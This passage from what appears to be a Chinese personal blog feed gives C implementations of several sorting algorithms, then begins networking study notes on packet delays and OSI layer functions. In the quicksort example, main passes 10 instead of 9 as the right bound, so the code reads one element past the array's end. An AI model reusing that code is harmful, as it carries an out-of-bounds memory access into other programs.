href="#插入排序1" class="headerlink" title="插入排序1"></a>插入排序1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">if</span>(a[i]&lt;a[i<span class="number">-1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp=a[i];</span><br><span class="line"><span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span> &amp;&amp; a[j]&gt;temp;j--)</span><br><span class="line">a[j+<span class="number">1</span>]=a[j];</span><br><span class="line">a[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">InsertSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="插入排序2"><a href="#插入排序2" class="headerlink" title="插入排序2"></a>插入排序2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,k,t;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;s;i++)</span><br><span class="line">&#123;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(a[j]&lt;a[i]&amp;&amp;(j&lt;i))</span><br><span class="line">j++;</span><br><span class="line"><span class="keyword">if</span>(i!=j)</span><br><span class="line">&#123;</span><br><span class="line">t=a[i];</span><br><span class="line"><span class="keyword">for</span>(k=i;k&gt;j;k--)</span><br><span class="line">a[k]=a[k<span class="number">-1</span>];</span><br><span class="line">a[j]=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">insertSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="希尔排序1"><a href="#希尔排序1" class="headerlink" title="希尔排序1"></a>希尔排序1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j,gap;</span><br><span class="line"><span class="keyword">for</span> (gap=n/<span class="number">2</span>;gap&gt;<span class="number">0</span>;gap/= <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span>(j=gap;j&lt;n;j++)</span><br><span class="line"><span class="keyword">if</span>(a[j]&lt;a[j-gap])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp=a[j];</span><br><span class="line"><span class="keyword">int</span> k=j-gap;</span><br><span class="line"><span class="keyword">while</span>(k&gt;=<span class="number">0</span> &amp;&amp; a[k]&gt;temp)</span><br><span class="line">&#123;</span><br><span class="line">a[k+gap]=a[k];</span><br><span class="line">k-=gap;</span><br><span class="line">&#125;</span><br><span class="line">a[k+gap]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">shellSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="希尔排序2"><a href="#希尔排序2" class="headerlink" title="希尔排序2"></a>希尔排序2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> d,i,j,temp;</span><br><span class="line">     <span class="keyword">for</span>(d=n/<span class="number">2</span>;d&gt;=<span class="number">1</span>;d/=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=d;i&lt;n;i++)&#123;</span><br><span class="line">            temp=a[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i-d;(j&gt;= <span class="number">0</span>) &amp;&amp; (a[j] &gt;temp);j=j-d)&#123;</span><br><span class="line">                a[j+d]=a[j];</span><br><span class="line">            &#125;</span><br><span class="line">            a[j+d]=temp;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">ShellSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="归并排序（递归实现）"><a href="#归并排序（递归实现）" class="headerlink" title="归并排序（递归实现）"></a>归并排序（递归实现）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 20 </span></span><br><span class="line"><span class="keyword">int</span> s[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,m[MAX];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> low,<span class="keyword">int</span> mid,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=low,j=mid+<span class="number">1</span>,k=low;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=high)</span><br><span class="line">        <span class="keyword">if</span>(s[i]&lt;s[j])</span><br><span class="line">            m[k++]=s[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            m[k++]=s[j++];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)</span><br><span class="line">        m[k++]=s[i++];</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=high)</span><br><span class="line">        m[k++]=s[j++];</span><br><span class="line">    <span class="keyword">for</span> ( i = low; i &lt;=high ; i++)</span><br><span class="line">        s[i]=m[i];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(a&lt;b)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(a+b)/<span class="number">2</span>;</span><br><span class="line">        mergeSort(a,mid);</span><br><span class="line">        mergeSort(mid+<span class="number">1</span>,b);</span><br><span class="line">        merge(a,mid,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">mergeSort(<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,s[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> s[],<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i=l,j=r,x=s[l];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; s[j]&gt;=x) </span><br><span class="line">j--;  </span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) </span><br><span class="line">s[i++]=s[j];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; s[i]&lt;x) </span><br><span class="line">i++;  </span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) </span><br><span class="line">s[j--]=s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s[i]=x;</span><br><span class="line">        quicksort(s,l,i<span class="number">-1</span>); </span><br><span class="line">        quicksort(s,i+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printlink</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s2;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">quicksort(a,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">printlink(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNum</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">t=num/<span class="built_in">pow</span>(<span class="number">10</span>,pos<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> t%<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RadixSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *<span class="built_in">array</span>[<span class="number">10</span>];  </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">array</span>[i]=(<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) *(s));</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> pos=<span class="number">1</span>;pos&lt;<span class="number">10</span>;pos++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> num=GetNum(a[i],pos);</span><br><span class="line"><span class="keyword">int</span> sum=++<span class="built_in">array</span>[num][<span class="number">0</span>];</span><br><span class="line"><span class="built_in">array</span>[num][sum]=a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="built_in">array</span>[i][<span class="number">0</span>];k++)</span><br><span class="line">a[j++]=<span class="built_in">array</span>[i][k];</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    RadixSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">( <span class="keyword">int</span> *a, <span class="keyword">int</span> *b )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">temp=*b;</span><br><span class="line">    *b=*a;</span><br><span class="line">    *a=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapAdjust</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> i,<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> child, temp;</span><br><span class="line">    <span class="keyword">for</span>(temp=a[i];<span class="number">2</span>*i+<span class="number">1</span>&lt;s;i=child)</span><br><span class="line">    &#123;</span><br><span class="line">        child=<span class="number">2</span>*i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(child!=s<span class="number">-1</span> &amp;&amp; a[child+<span class="number">1</span>]&gt;a[child])</span><br><span class="line">            ++child;</span><br><span class="line">        <span class="keyword">if</span> (temp&lt;a[child])</span><br><span class="line">            a[i]=a[child];</span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=s/<span class="number">2</span><span class="number">-1</span>;i&gt;=<span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        HeapAdjust(a,i,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=s<span class="number">-1</span>;i&gt;<span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Swap(&amp;a[<span class="number">0</span>],&amp;a[i]);</span><br><span class="line">        HeapAdjust(a,<span class="number">0</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    HeapSort(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近一段时间对8大排序算法进行了整理，并用C语言进行了简单的实现。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;简单选择排序&quot;&gt;&lt;a href=&quot;#简单选择排序&quot; class=&quot;headerlink&quot; title=&quot;简单选择排序&quot;&gt;&lt;/a&gt;简单选择排序&lt;/h3&gt;&lt;figure
      
    
    </summary>
    
    
      <category term="数据结构与算法" scheme="elssm.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络学习笔记</title>
    <link href="elssm.github.io/2018/09/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2018/09/17/计算机网络学习笔记/</id>
    <published>2018-09-17T13:27:01.000Z</published>
    <updated>2018-09-18T07:07:06.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="四种分组延迟"><a href="#四种分组延迟" class="headerlink" title="四种分组延迟"></a>四种分组延迟</h3><p>结点处理延迟</p><p>排队延迟</p><p>传输延迟</p><p>传播延迟</p><h3 id="物理层功能"><a href="#物理层功能" class="headerlink" title="物理层功能"></a>物理层功能</h3><p>接口特性（机械特性，电气特性，功能特性，规程特性）</p><p>比特编码</p><p>数据率</p><p>比特同步（时钟同步）</p><p>传输模式（单工，半双工，全双工）</p><h3 id="数据链路层功能"><a href="#数据链路层功能" class="headerlink" title="数据链路层功能"></a>数据链路层功能</h3><p>负责结点-结点数据传输 </p><p>组帧</p><p>物理寻址 </p><p>流量控制（避免淹没接收端）</p><p>差错控制（检测并重传损坏或丢失帧，并避免重复帧）</p><p>访问控制（在任一给定时刻决定哪个设备拥有链路控制使用权）</p><h3 id="网络层功能"><a href="#网络层功能" class="headerlink" title="网络层功能"></a>网络层功能</h3><p>负责源主机到目的主机数据分组交付（可能穿越多个网络）</p><p>逻辑寻址（全局唯一逻辑地址，确保数据分组被送达目的主机，如IP地址）</p><p>路由（路由器互联网络，并路由分组至最终目的主机）</p><p>分组转发</p><h3 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h3><p>报文的分段和重组</p><p>SAP寻址（确保将完整报文提交给正确进程，如端口号）</p><p>连接控制</p><p>流量控制</p><p>差错控制</p><h3 id="会话层功能"><a href="#会话层功能" class="headerlink" title="会话层功能"></a>会话层功能</h3><p>对话控制（建立，维护）</p><p>同步（在数据流中插入同步点）</p><h3 id="表述层功能"><a href="#表述层功能" class="headerlink" title="表述层功能"></a>表述层功能</h3><p>数据表示转化（转换为主机摆）</p><h3 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h3><p>支持用户通过用户代理或网络接口使用网络</p><p>典型应用层服务</p><h3 id="网络应用的体系结构"><a href="#网络应用的体系结构" class="headerlink" title="网络应用的体系结构"></a>网络应用的体系结构</h3><p>客户机/服务器结构（Client-Server，C/S）</p><p>点对点结构（Peer-to-peer，P2P）</p><p>混合结构（Hybrid）</p><h4 id="客户机-服务器结构"><a href="#客户机-服务器结构" class="headerlink" title="客户机/服务器结构"></a>客户机/服务器结构</h4><p>服务器</p><ul><li>7*24小时提供服务</li><li>永久性访问地址/域名</li><li>利用大量服务器实现可扩展性</li></ul><p>客户机</p><ul><li>与服务器通信，使用服务器提供的服务</li><li>间歇性接入网络</li><li>可能使用动态IP地址</li><li>不会与其他客户机直接通信</li></ul><h4 id="纯P2P结构"><a href="#纯P2P结构" class="headerlink" 